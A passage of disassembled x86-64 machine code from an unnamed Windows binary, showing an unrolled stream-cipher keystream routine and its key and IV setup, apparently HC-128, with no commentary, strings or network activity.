   140006c10:	44 33 c0             	xor    %eax,%r8d
   140006c13:	8b 83 64 10 00 00    	mov    0x1064(%rbx),%eax
   140006c19:	c1 c8 18             	ror    $0x18,%eax
   140006c1c:	44 03 c0             	add    %eax,%r8d
   140006c1f:	8b c2                	mov    %edx,%eax
   140006c21:	45 03 01             	add    (%r9),%r8d
   140006c24:	c1 e8 10             	shr    $0x10,%eax
   140006c27:	0f b6 c8             	movzbl %al,%ecx
   140006c2a:	0f b6 c2             	movzbl %dl,%eax
   140006c2d:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006c34:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006c37:	8d 87 05 02 00 00    	lea    0x205(%rdi),%eax
   140006c3d:	44 33 c2             	xor    %edx,%r8d
   140006c40:	45 89 01             	mov    %r8d,(%r9)
   140006c43:	4c 8d 0c 83          	lea    (%rbx,%rax,4),%r9
   140006c47:	8b 93 60 10 00 00    	mov    0x1060(%rbx),%edx
   140006c4d:	44 89 83 4c 10 00 00 	mov    %r8d,0x104c(%rbx)
   140006c54:	41 8b 01             	mov    (%r9),%eax
   140006c57:	44 8b 83 44 10 00 00 	mov    0x1044(%rbx),%r8d
   140006c5e:	c1 c8 09             	ror    $0x9,%eax
   140006c61:	41 c1 c8 16          	ror    $0x16,%r8d
   140006c65:	44 33 c0             	xor    %eax,%r8d
   140006c68:	8b 83 68 10 00 00    	mov    0x1068(%rbx),%eax
   140006c6e:	c1 c8 18             	ror    $0x18,%eax
   140006c71:	44 03 c0             	add    %eax,%r8d
   140006c74:	8b c2                	mov    %edx,%eax
   140006c76:	45 03 02             	add    (%r10),%r8d
   140006c79:	c1 e8 10             	shr    $0x10,%eax
   140006c7c:	0f b6 c8             	movzbl %al,%ecx
   140006c7f:	0f b6 c2             	movzbl %dl,%eax
   140006c82:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006c89:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006c8c:	8d 87 06 02 00 00    	lea    0x206(%rdi),%eax
   140006c92:	44 33 c2             	xor    %edx,%r8d
   140006c95:	4c 8d 1c 83          	lea    (%rbx,%rax,4),%r11
   140006c99:	45 89 02             	mov    %r8d,(%r10)
   140006c9c:	8b 93 64 10 00 00    	mov    0x1064(%rbx),%edx
   140006ca2:	44 89 83 50 10 00 00 	mov    %r8d,0x1050(%rbx)
   140006ca9:	41 8b 03             	mov    (%r11),%eax
   140006cac:	44 8b 83 48 10 00 00 	mov    0x1048(%rbx),%r8d
   140006cb3:	c1 c8 09             	ror    $0x9,%eax
   140006cb6:	41 c1 c8 16          	ror    $0x16,%r8d
   140006cba:	44 33 c0             	xor    %eax,%r8d
   140006cbd:	8b 83 6c 10 00 00    	mov    0x106c(%rbx),%eax
   140006cc3:	c1 c8 18             	ror    $0x18,%eax
   140006cc6:	44 03 c0             	add    %eax,%r8d
   140006cc9:	8b c2                	mov    %edx,%eax
   140006ccb:	45 03 01             	add    (%r9),%r8d
   140006cce:	c1 e8 10             	shr    $0x10,%eax
   140006cd1:	0f b6 c8             	movzbl %al,%ecx
   140006cd4:	0f b6 c2             	movzbl %dl,%eax
   140006cd7:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006cde:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006ce1:	8d 87 07 02 00 00    	lea    0x207(%rdi),%eax
   140006ce7:	44 33 c2             	xor    %edx,%r8d
   140006cea:	4c 8d 14 83          	lea    (%rbx,%rax,4),%r10
   140006cee:	45 89 01             	mov    %r8d,(%r9)
   140006cf1:	8b 93 68 10 00 00    	mov    0x1068(%rbx),%edx
   140006cf7:	44 89 83 54 10 00 00 	mov    %r8d,0x1054(%rbx)
   140006cfe:	41 8b 02             	mov    (%r10),%eax
   140006d01:	44 8b 83 4c 10 00 00 	mov    0x104c(%rbx),%r8d
   140006d08:	c1 c8 09             	ror    $0x9,%eax
   140006d0b:	41 c1 c8 16          	ror    $0x16,%r8d
   140006d0f:	44 33 c0             	xor    %eax,%r8d
   140006d12:	8b 83 70 10 00 00    	mov    0x1070(%rbx),%eax
   140006d18:	c1 c8 18             	ror    $0x18,%eax
   140006d1b:	44 03 c0             	add    %eax,%r8d
   140006d1e:	8b c2                	mov    %edx,%eax
   140006d20:	45 03 03             	add    (%r11),%r8d
   140006d23:	c1 e8 10             	shr    $0x10,%eax
   140006d26:	0f b6 c8             	movzbl %al,%ecx
   140006d29:	0f b6 c2             	movzbl %dl,%eax
   140006d2c:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006d33:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006d36:	8d 87 08 02 00 00    	lea    0x208(%rdi),%eax
   140006d3c:	44 33 c2             	xor    %edx,%r8d
   140006d3f:	4c 8d 0c 83          	lea    (%rbx,%rax,4),%r9
   140006d43:	45 89 03             	mov    %r8d,(%r11)
   140006d46:	8b 93 6c 10 00 00    	mov    0x106c(%rbx),%edx
   140006d4c:	44 89 83 58 10 00 00 	mov    %r8d,0x1058(%rbx)
   140006d53:	44 8b 83 50 10 00 00 	mov    0x1050(%rbx),%r8d
   140006d5a:	41 8b 01             	mov    (%r9),%eax
   140006d5d:	c1 c8 09             	ror    $0x9,%eax
   140006d60:	41 c1 c8 16          	ror    $0x16,%r8d
   140006d64:	44 33 c0             	xor    %eax,%r8d
   140006d67:	8b 83 74 10 00 00    	mov    0x1074(%rbx),%eax
   140006d6d:	c1 c8 18             	ror    $0x18,%eax
   140006d70:	44 03 c0             	add    %eax,%r8d
   140006d73:	8b c2                	mov    %edx,%eax
   140006d75:	45 03 02             	add    (%r10),%r8d
   140006d78:	c1 e8 10             	shr    $0x10,%eax
   140006d7b:	0f b6 c8             	movzbl %al,%ecx
   140006d7e:	0f b6 c2             	movzbl %dl,%eax
   140006d81:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006d88:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006d8b:	8d 87 09 02 00 00    	lea    0x209(%rdi),%eax
   140006d91:	44 33 c2             	xor    %edx,%r8d
   140006d94:	45 89 02             	mov    %r8d,(%r10)
   140006d97:	4c 8d 14 83          	lea    (%rbx,%rax,4),%r10
   140006d9b:	8b 93 70 10 00 00    	mov    0x1070(%rbx),%edx
   140006da1:	44 89 83 5c 10 00 00 	mov    %r8d,0x105c(%rbx)
   140006da8:	41 8b 02             	mov    (%r10),%eax
   140006dab:	44 8b 83 54 10 00 00 	mov    0x1054(%rbx),%r8d
   140006db2:	c1 c8 09             	ror    $0x9,%eax
   140006db5:	41 c1 c8 16          	ror    $0x16,%r8d
   140006db9:	44 33 c0             	xor    %eax,%r8d
   140006dbc:	8b 83 78 10 00 00    	mov    0x1078(%rbx),%eax
   140006dc2:	c1 c8 18             	ror    $0x18,%eax
   140006dc5:	44 03 c0             	add    %eax,%r8d
   140006dc8:	8b c2                	mov    %edx,%eax
   140006dca:	45 03 01             	add    (%r9),%r8d
   140006dcd:	c1 e8 10             	shr    $0x10,%eax
   140006dd0:	0f b6 c8             	movzbl %al,%ecx
   140006dd3:	0f b6 c2             	movzbl %dl,%eax
   140006dd6:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006ddd:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006de0:	8d 87 0a 02 00 00    	lea    0x20a(%rdi),%eax
   140006de6:	44 33 c2             	xor    %edx,%r8d
   140006de9:	45 89 01             	mov    %r8d,(%r9)
   140006dec:	4c 8d 0c 83          	lea    (%rbx,%rax,4),%r9
   140006df0:	8b 93 74 10 00 00    	mov    0x1074(%rbx),%edx
   140006df6:	44 89 83 60 10 00 00 	mov    %r8d,0x1060(%rbx)
   140006dfd:	41 8b 01             	mov    (%r9),%eax
   140006e00:	44 8b 83 58 10 00 00 	mov    0x1058(%rbx),%r8d
   140006e07:	c1 c8 09             	ror    $0x9,%eax
   140006e0a:	41 c1 c8 16          	ror    $0x16,%r8d
   140006e0e:	44 33 c0             	xor    %eax,%r8d
   140006e11:	8b 83 7c 10 00 00    	mov    0x107c(%rbx),%eax
   140006e17:	c1 c8 18             	ror    $0x18,%eax
   140006e1a:	44 03 c0             	add    %eax,%r8d
   140006e1d:	8b c2                	mov    %edx,%eax
   140006e1f:	45 03 02             	add    (%r10),%r8d
   140006e22:	c1 e8 10             	shr    $0x10,%eax
   140006e25:	0f b6 c8             	movzbl %al,%ecx
   140006e28:	0f b6 c2             	movzbl %dl,%eax
   140006e2b:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006e32:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006e35:	8d 87 0b 02 00 00    	lea    0x20b(%rdi),%eax
   140006e3b:	44 33 c2             	xor    %edx,%r8d
   140006e3e:	45 89 02             	mov    %r8d,(%r10)
   140006e41:	4c 8d 14 83          	lea    (%rbx,%rax,4),%r10
   140006e45:	8b 93 78 10 00 00    	mov    0x1078(%rbx),%edx
   140006e4b:	44 89 83 64 10 00 00 	mov    %r8d,0x1064(%rbx)
   140006e52:	41 8b 02             	mov    (%r10),%eax
   140006e55:	44 8b 83 5c 10 00 00 	mov    0x105c(%rbx),%r8d
   140006e5c:	c1 c8 09             	ror    $0x9,%eax
   140006e5f:	41 c1 c8 16          	ror    $0x16,%r8d
   140006e63:	44 33 c0             	xor    %eax,%r8d
   140006e66:	8b 83 40 10 00 00    	mov    0x1040(%rbx),%eax
   140006e6c:	c1 c8 18             	ror    $0x18,%eax
   140006e6f:	44 03 c0             	add    %eax,%r8d
   140006e72:	8b c2                	mov    %edx,%eax
   140006e74:	45 03 01             	add    (%r9),%r8d
   140006e77:	c1 e8 10             	shr    $0x10,%eax
   140006e7a:	0f b6 c8             	movzbl %al,%ecx
   140006e7d:	0f b6 c2             	movzbl %dl,%eax
   140006e80:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006e87:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006e8a:	8d 87 0c 02 00 00    	lea    0x20c(%rdi),%eax
   140006e90:	44 33 c2             	xor    %edx,%r8d
   140006e93:	45 89 01             	mov    %r8d,(%r9)
   140006e96:	4c 8d 0c 83          	lea    (%rbx,%rax,4),%r9
   140006e9a:	8b 93 7c 10 00 00    	mov    0x107c(%rbx),%edx
   140006ea0:	44 89 83 68 10 00 00 	mov    %r8d,0x1068(%rbx)
   140006ea7:	41 8b 01             	mov    (%r9),%eax
   140006eaa:	44 8b 83 60 10 00 00 	mov    0x1060(%rbx),%r8d
   140006eb1:	c1 c8 09             	ror    $0x9,%eax
   140006eb4:	41 c1 c8 16          	ror    $0x16,%r8d
   140006eb8:	44 33 c0             	xor    %eax,%r8d
   140006ebb:	8b 83 44 10 00 00    	mov    0x1044(%rbx),%eax
   140006ec1:	c1 c8 18             	ror    $0x18,%eax
   140006ec4:	44 03 c0             	add    %eax,%r8d
   140006ec7:	8b c2                	mov    %edx,%eax
   140006ec9:	45 03 02             	add    (%r10),%r8d
   140006ecc:	c1 e8 10             	shr    $0x10,%eax
   140006ecf:	0f b6 c8             	movzbl %al,%ecx
   140006ed2:	0f b6 c2             	movzbl %dl,%eax
   140006ed5:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006edc:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006edf:	8d 87 0d 02 00 00    	lea    0x20d(%rdi),%eax
   140006ee5:	44 33 c2             	xor    %edx,%r8d
   140006ee8:	45 89 02             	mov    %r8d,(%r10)
   140006eeb:	4c 8d 14 83          	lea    (%rbx,%rax,4),%r10
   140006eef:	8b 93 40 10 00 00    	mov    0x1040(%rbx),%edx
   140006ef5:	44 89 83 6c 10 00 00 	mov    %r8d,0x106c(%rbx)
   140006efc:	41 8b 02             	mov    (%r10),%eax
   140006eff:	44 8b 83 64 10 00 00 	mov    0x1064(%rbx),%r8d
   140006f06:	c1 c8 09             	ror    $0x9,%eax
   140006f09:	41 c1 c8 16          	ror    $0x16,%r8d
   140006f0d:	44 33 c0             	xor    %eax,%r8d
   140006f10:	8b 83 48 10 00 00    	mov    0x1048(%rbx),%eax
   140006f16:	c1 c8 18             	ror    $0x18,%eax
   140006f19:	44 03 c0             	add    %eax,%r8d
   140006f1c:	8b c2                	mov    %edx,%eax
   140006f1e:	45 03 01             	add    (%r9),%r8d
   140006f21:	c1 e8 10             	shr    $0x10,%eax
   140006f24:	0f b6 c8             	movzbl %al,%ecx
   140006f27:	0f b6 c2             	movzbl %dl,%eax
   140006f2a:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006f31:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006f34:	8d 87 0e 02 00 00    	lea    0x20e(%rdi),%eax
   140006f3a:	44 33 c2             	xor    %edx,%r8d
   140006f3d:	4c 8d 1c 83          	lea    (%rbx,%rax,4),%r11
   140006f41:	45 89 01             	mov    %r8d,(%r9)
   140006f44:	8b 93 44 10 00 00    	mov    0x1044(%rbx),%edx
   140006f4a:	44 89 83 70 10 00 00 	mov    %r8d,0x1070(%rbx)
   140006f51:	41 8b 03             	mov    (%r11),%eax
   140006f54:	44 8b 83 68 10 00 00 	mov    0x1068(%rbx),%r8d
   140006f5b:	c1 c8 09             	ror    $0x9,%eax
   140006f5e:	41 c1 c8 16          	ror    $0x16,%r8d
   140006f62:	44 33 c0             	xor    %eax,%r8d
   140006f65:	8b 83 4c 10 00 00    	mov    0x104c(%rbx),%eax
   140006f6b:	c1 c8 18             	ror    $0x18,%eax
   140006f6e:	44 03 c0             	add    %eax,%r8d
   140006f71:	8b c2                	mov    %edx,%eax
   140006f73:	45 03 02             	add    (%r10),%r8d
   140006f76:	c1 e8 10             	shr    $0x10,%eax
   140006f79:	0f b6 c8             	movzbl %al,%ecx
   140006f7c:	0f b6 c2             	movzbl %dl,%eax
   140006f7f:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006f86:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006f89:	8d 87 0f 02 00 00    	lea    0x20f(%rdi),%eax
   140006f8f:	44 33 c2             	xor    %edx,%r8d
   140006f92:	4c 8d 0c 83          	lea    (%rbx,%rax,4),%r9
   140006f96:	45 89 02             	mov    %r8d,(%r10)
   140006f99:	8b 93 48 10 00 00    	mov    0x1048(%rbx),%edx
   140006f9f:	44 89 83 74 10 00 00 	mov    %r8d,0x1074(%rbx)
   140006fa6:	41 8b 01             	mov    (%r9),%eax
   140006fa9:	44 8b 83 6c 10 00 00 	mov    0x106c(%rbx),%r8d
   140006fb0:	c1 c8 09             	ror    $0x9,%eax
   140006fb3:	41 c1 c8 16          	ror    $0x16,%r8d
   140006fb7:	44 33 c0             	xor    %eax,%r8d
   140006fba:	8b 83 50 10 00 00    	mov    0x1050(%rbx),%eax
   140006fc0:	c1 c8 18             	ror    $0x18,%eax
   140006fc3:	44 03 c0             	add    %eax,%r8d
   140006fc6:	8b c2                	mov    %edx,%eax
   140006fc8:	45 03 03             	add    (%r11),%r8d
   140006fcb:	c1 e8 10             	shr    $0x10,%eax
   140006fce:	0f b6 c8             	movzbl %al,%ecx
   140006fd1:	0f b6 c2             	movzbl %dl,%eax
   140006fd4:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140006fdb:	03 14 83             	add    (%rbx,%rax,4),%edx
   140006fde:	8d 86 00 02 00 00    	lea    0x200(%rsi),%eax
   140006fe4:	44 33 c2             	xor    %edx,%r8d
   140006fe7:	45 89 03             	mov    %r8d,(%r11)
   140006fea:	8b 93 4c 10 00 00    	mov    0x104c(%rbx),%edx
   140006ff0:	44 89 83 78 10 00 00 	mov    %r8d,0x1078(%rbx)
   140006ff7:	44 8b 04 83          	mov    (%rbx,%rax,4),%r8d
   140006ffb:	8b 83 70 10 00 00    	mov    0x1070(%rbx),%eax
   140007001:	c1 c8 16             	ror    $0x16,%eax
   140007004:	41 c1 c8 09          	ror    $0x9,%r8d
   140007008:	44 33 c0             	xor    %eax,%r8d
   14000700b:	8b 83 54 10 00 00    	mov    0x1054(%rbx),%eax
   140007011:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   140007016:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   14000701b:	c1 c8 18             	ror    $0x18,%eax
   14000701e:	44 03 c0             	add    %eax,%r8d
   140007021:	8b c2                	mov    %edx,%eax
   140007023:	45 03 01             	add    (%r9),%r8d
   140007026:	c1 e8 10             	shr    $0x10,%eax
   140007029:	0f b6 c8             	movzbl %al,%ecx
   14000702c:	0f b6 c2             	movzbl %dl,%eax
   14000702f:	8b 94 8b 00 04 00 00 	mov    0x400(%rbx,%rcx,4),%edx
   140007036:	03 14 83             	add    (%rbx,%rax,4),%edx
   140007039:	44 33 c2             	xor    %edx,%r8d
   14000703c:	45 89 01             	mov    %r8d,(%r9)
   14000703f:	44 89 83 7c 10 00 00 	mov    %r8d,0x107c(%rbx)
   140007046:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000704b:	c3                   	ret
   14000704c:	cc                   	int3
   14000704d:	cc                   	int3
   14000704e:	cc                   	int3
   14000704f:	cc                   	int3
   140007050:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007055:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000705a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000705f:	41 56                	push   %r14
   140007061:	48 83 ec 20          	sub    $0x20,%rsp
   140007065:	45 33 c0             	xor    %r8d,%r8d
   140007068:	48 8b d9             	mov    %rcx,%rbx
   14000706b:	f7 81 c8 10 00 00 e0 	testl  $0xffffffe0,0x10c8(%rcx)
   140007072:	ff ff ff 
   140007075:	76 2c                	jbe    0x1400070a3
   140007077:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000707e:	00 00 
   140007080:	42 8b 04 82          	mov    (%rdx,%r8,4),%eax
   140007084:	42 89 84 81 a4 10 00 	mov    %eax,0x10a4(%rcx,%r8,4)
   14000708b:	00 
   14000708c:	41 ff c0             	inc    %r8d
   14000708f:	8b 81 c8 10 00 00    	mov    0x10c8(%rcx),%eax
   140007095:	c1 e8 05             	shr    $0x5,%eax
   140007098:	44 3b c0             	cmp    %eax,%r8d
   14000709b:	72 e3                	jb     0x140007080
   14000709d:	41 83 f8 08          	cmp    $0x8,%r8d
   1400070a1:	73 37                	jae    0x1400070da
   1400070a3:	41 8b d0             	mov    %r8d,%edx
   1400070a6:	48 81 c2 29 04 00 00 	add    $0x429,%rdx
   1400070ad:	48 8d 14 91          	lea    (%rcx,%rdx,4),%rdx
   1400070b1:	0f 1f 40 00          	nopl   0x0(%rax)
   1400070b5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400070bc:	00 00 00 00 
   1400070c0:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   1400070c4:	41 ff c0             	inc    %r8d
   1400070c7:	8b 84 81 a4 10 00 00 	mov    0x10a4(%rcx,%rax,4),%eax
   1400070ce:	89 02                	mov    %eax,(%rdx)
   1400070d0:	48 8d 52 04          	lea    0x4(%rdx),%rdx
   1400070d4:	41 83 f8 08          	cmp    $0x8,%r8d
   1400070d8:	72 e6                	jb     0x1400070c0
   1400070da:	8b 81 84 10 00 00    	mov    0x1084(%rcx),%eax
   1400070e0:	4c 8d 49 38          	lea    0x38(%rcx),%r9
   1400070e4:	89 01                	mov    %eax,(%rcx)
   1400070e6:	48 8d 71 40          	lea    0x40(%rcx),%rsi
   1400070ea:	8b 81 88 10 00 00    	mov    0x1088(%rcx),%eax
   1400070f0:	41 bb 10 00 00 00    	mov    $0x10,%r11d
   1400070f6:	89 41 04             	mov    %eax,0x4(%rcx)
   1400070f9:	41 8b fb             	mov    %r11d,%edi
   1400070fc:	8b 81 8c 10 00 00    	mov    0x108c(%rcx),%eax
   140007102:	4c 8b f6             	mov    %rsi,%r14
   140007105:	89 41 08             	mov    %eax,0x8(%rcx)
   140007108:	4d 8b d1             	mov    %r9,%r10
   14000710b:	8b 81 90 10 00 00    	mov    0x1090(%rcx),%eax
   140007111:	89 41 0c             	mov    %eax,0xc(%rcx)
   140007114:	8b 81 94 10 00 00    	mov    0x1094(%rcx),%eax
   14000711a:	89 41 10             	mov    %eax,0x10(%rcx)
   14000711d:	8b 81 98 10 00 00    	mov    0x1098(%rcx),%eax
   140007123:	89 41 14             	mov    %eax,0x14(%rcx)
   140007126:	8b 81 9c 10 00 00    	mov    0x109c(%rcx),%eax
   14000712c:	89 41 18             	mov    %eax,0x18(%rcx)
   14000712f:	8b 81 a0 10 00 00    	mov    0x10a0(%rcx),%eax
   140007135:	89 41 1c             	mov    %eax,0x1c(%rcx)
   140007138:	8b 81 a4 10 00 00    	mov    0x10a4(%rcx),%eax
   14000713e:	89 41 20             	mov    %eax,0x20(%rcx)
   140007141:	8b 81 a8 10 00 00    	mov    0x10a8(%rcx),%eax
   140007147:	89 41 24             	mov    %eax,0x24(%rcx)
   14000714a:	8b 81 ac 10 00 00    	mov    0x10ac(%rcx),%eax
   140007150:	89 41 28             	mov    %eax,0x28(%rcx)
   140007153:	8b 81 b0 10 00 00    	mov    0x10b0(%rcx),%eax
   140007159:	89 41 2c             	mov    %eax,0x2c(%rcx)
   14000715c:	8b 81 b4 10 00 00    	mov    0x10b4(%rcx),%eax
   140007162:	89 41 30             	mov    %eax,0x30(%rcx)
   140007165:	8b 81 b8 10 00 00    	mov    0x10b8(%rcx),%eax
   14000716b:	89 41 34             	mov    %eax,0x34(%rcx)
   14000716e:	8b 81 bc 10 00 00    	mov    0x10bc(%rcx),%eax
   140007174:	41 89 01             	mov    %eax,(%r9)
   140007177:	8b 81 c0 10 00 00    	mov    0x10c0(%rcx),%eax
   14000717d:	89 41 3c             	mov    %eax,0x3c(%rcx)
   140007180:	41 8b 4a cc          	mov    -0x34(%r10),%ecx
   140007184:	44 8b c1             	mov    %ecx,%r8d
   140007187:	41 8b 12             	mov    (%r10),%edx
   14000718a:	4d 8d 52 04          	lea    0x4(%r10),%r10
   14000718e:	41 c1 c8 12          	ror    $0x12,%r8d
   140007192:	4d 8d 76 04          	lea    0x4(%r14),%r14
   140007196:	8b c1                	mov    %ecx,%eax
   140007198:	c1 e9 03             	shr    $0x3,%ecx
   14000719b:	c1 c8 07             	ror    $0x7,%eax
   14000719e:	44 33 c0             	xor    %eax,%r8d
   1400071a1:	8b c2                	mov    %edx,%eax
   1400071a3:	44 33 c1             	xor    %ecx,%r8d
   1400071a6:	c1 c8 11             	ror    $0x11,%eax
   1400071a9:	8b ca                	mov    %edx,%ecx
   1400071ab:	c1 ea 0a             	shr    $0xa,%edx
   1400071ae:	c1 c9 13             	ror    $0x13,%ecx
   1400071b1:	33 c8                	xor    %eax,%ecx
   1400071b3:	33 ca                	xor    %edx,%ecx
   1400071b5:	44 03 c1             	add    %ecx,%r8d
   1400071b8:	45 03 42 c4          	add    -0x3c(%r10),%r8d
   1400071bc:	45 03 42 e8          	add    -0x18(%r10),%r8d
   1400071c0:	44 03 c7             	add    %edi,%r8d
   1400071c3:	ff c7                	inc    %edi
   1400071c5:	45 89 46 fc          	mov    %r8d,-0x4(%r14)
   1400071c9:	81 ff 10 01 00 00    	cmp    $0x110,%edi
   1400071cf:	72 af                	jb     0x140007180
   1400071d1:	0f 10 83 00 04 00 00 	movups 0x400(%rbx),%xmm0
   1400071d8:	0f 11 03             	movups %xmm0,(%rbx)
   1400071db:	0f 10 8b 10 04 00 00 	movups 0x410(%rbx),%xmm1
   1400071e2:	0f 11 4b 10          	movups %xmm1,0x10(%rbx)
   1400071e6:	0f 10 83 20 04 00 00 	movups 0x420(%rbx),%xmm0
   1400071ed:	0f 11 43 20          	movups %xmm0,0x20(%rbx)
   1400071f1:	0f 10 8b 30 04 00 00 	movups 0x430(%rbx),%xmm1
   1400071f8:	0f 11 4b 30          	movups %xmm1,0x30(%rbx)
   1400071fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140007200:	41 8b 09             	mov    (%r9),%ecx
   140007203:	44 8b c1             	mov    %ecx,%r8d
   140007206:	41 8b 51 cc          	mov    -0x34(%r9),%edx
   14000720a:	4d 8d 49 04          	lea    0x4(%r9),%r9
   14000720e:	8b c1                	mov    %ecx,%eax
   140007210:	41 c1 c8 13          	ror    $0x13,%r8d
   140007214:	c1 c8 11             	ror    $0x11,%eax
   140007217:	48 8d 76 04          	lea    0x4(%rsi),%rsi
   14000721b:	44 33 c0             	xor    %eax,%r8d
   14000721e:	c1 e9 0a             	shr    $0xa,%ecx
   140007221:	44 33 c1             	xor    %ecx,%r8d
   140007224:	8b c2                	mov    %edx,%eax
   140007226:	c1 c8 07             	ror    $0x7,%eax
   140007229:	8b ca                	mov    %edx,%ecx
   14000722b:	c1 c9 12             	ror    $0x12,%ecx
   14000722e:	33 c1                	xor    %ecx,%eax
   140007230:	c1 ea 03             	shr    $0x3,%edx
   140007233:	33 c2                	xor    %edx,%eax
   140007235:	05 00 01 00 00       	add    $0x100,%eax
   14000723a:	41 03 c0             	add    %r8d,%eax
   14000723d:	41 03 41 c4          	add    -0x3c(%r9),%eax
   140007241:	41 03 41 e8          	add    -0x18(%r9),%eax
   140007245:	41 03 c3             	add    %r11d,%eax
   140007248:	41 ff c3             	inc    %r11d
   14000724b:	89 46 fc             	mov    %eax,-0x4(%rsi)
   14000724e:	41 81 fb 00 04 00 00 	cmp    $0x400,%r11d
   140007255:	72 a9                	jb     0x140007200
   140007257:	c7 83 80 10 00 00 00 	movl   $0x0,0x1080(%rbx)
   14000725e:	00 00 00 
   140007261:	bf 40 00 00 00       	mov    $0x40,%edi
   140007266:	8b 83 c0 07 00 00    	mov    0x7c0(%rbx),%eax
   14000726c:	89 83 00 10 00 00    	mov    %eax,0x1000(%rbx)
   140007272:	8b 83 c4 07 00 00    	mov    0x7c4(%rbx),%eax
   140007278:	89 83 04 10 00 00    	mov    %eax,0x1004(%rbx)
   14000727e:	8b 83 c8 07 00 00    	mov    0x7c8(%rbx),%eax
   140007284:	89 83 08 10 00 00    	mov    %eax,0x1008(%rbx)
   14000728a:	8b 83 cc 07 00 00    	mov    0x7cc(%rbx),%eax
   140007290:	89 83 0c 10 00 00    	mov    %eax,0x100c(%rbx)
   140007296:	8b 83 d0 07 00 00    	mov    0x7d0(%rbx),%eax
   14000729c:	89 83 10 10 00 00    	mov    %eax,0x1010(%rbx)
   1400072a2:	8b 83 d4 07 00 00    	mov    0x7d4(%rbx),%eax
   1400072a8:	89 83 14 10 00 00    	mov    %eax,0x1014(%rbx)
   1400072ae:	8b 83 d8 07 00 00    	mov    0x7d8(%rbx),%eax
   1400072b4:	89 83 18 10 00 00    	mov    %eax,0x1018(%rbx)
   1400072ba:	8b 83 dc 07 00 00    	mov    0x7dc(%rbx),%eax
   1400072c0:	89 83 1c 10 00 00    	mov    %eax,0x101c(%rbx)
   1400072c6:	8b 83 e0 07 00 00    	mov    0x7e0(%rbx),%eax
   1400072cc:	89 83 20 10 00 00    	mov    %eax,0x1020(%rbx)
   1400072d2:	8b 83 e4 07 00 00    	mov    0x7e4(%rbx),%eax
   1400072d8:	89 83 24 10 00 00    	mov    %eax,0x1024(%rbx)
   1400072de:	8b 83 e8 07 00 00    	mov    0x7e8(%rbx),%eax
   1400072e4:	89 83 28 10 00 00    	mov    %eax,0x1028(%rbx)
   1400072ea:	8b 83 ec 07 00 00    	mov    0x7ec(%rbx),%eax
   1400072f0:	89 83 2c 10 00 00    	mov    %eax,0x102c(%rbx)
   1400072f6:	8b 83 f0 07 00 00    	mov    0x7f0(%rbx),%eax
   1400072fc:	89 83 30 10 00 00    	mov    %eax,0x1030(%rbx)
   140007302:	8b 83 f4 07 00 00    	mov    0x7f4(%rbx),%eax
   140007308:	89 83 34 10 00 00    	mov    %eax,0x1034(%rbx)
   14000730e:	8b 83 f8 07 00 00    	mov    0x7f8(%rbx),%eax
   140007314:	89 83 38 10 00 00    	mov    %eax,0x1038(%rbx)
   14000731a:	8b 83 fc 07 00 00    	mov    0x7fc(%rbx),%eax
   140007320:	89 83 3c 10 00 00    	mov    %eax,0x103c(%rbx)
   140007326:	8b 83 c0 0f 00 00    	mov    0xfc0(%rbx),%eax
   14000732c:	89 83 40 10 00 00    	mov    %eax,0x1040(%rbx)
   140007332:	8b 83 c4 0f 00 00    	mov    0xfc4(%rbx),%eax
   140007338:	89 83 44 10 00 00    	mov    %eax,0x1044(%rbx)
   14000733e:	8b 83 c8 0f 00 00    	mov    0xfc8(%rbx),%eax
   140007344:	89 83 48 10 00 00    	mov    %eax,0x1048(%rbx)
   14000734a:	8b 83 cc 0f 00 00    	mov    0xfcc(%rbx),%eax
   140007350:	89 83 4c 10 00 00    	mov    %eax,0x104c(%rbx)
   140007356:	8b 83 d0 0f 00 00    	mov    0xfd0(%rbx),%eax
   14000735c:	89 83 50 10 00 00    	mov    %eax,0x1050(%rbx)
   140007362:	8b 83 d4 0f 00 00    	mov    0xfd4(%rbx),%eax
   140007368:	89 83 54 10 00 00    	mov    %eax,0x1054(%rbx)
   14000736e:	8b 83 d8 0f 00 00    	mov    0xfd8(%rbx),%eax
   140007374:	89 83 58 10 00 00    	mov    %eax,0x1058(%rbx)
   14000737a:	8b 83 dc 0f 00 00    	mov    0xfdc(%rbx),%eax
   140007380:	89 83 5c 10 00 00    	mov    %eax,0x105c(%rbx)
   140007386:	8b 83 e0 0f 00 00    	mov    0xfe0(%rbx),%eax
   14000738c:	89 83 60 10 00 00    	mov    %eax,0x1060(%rbx)
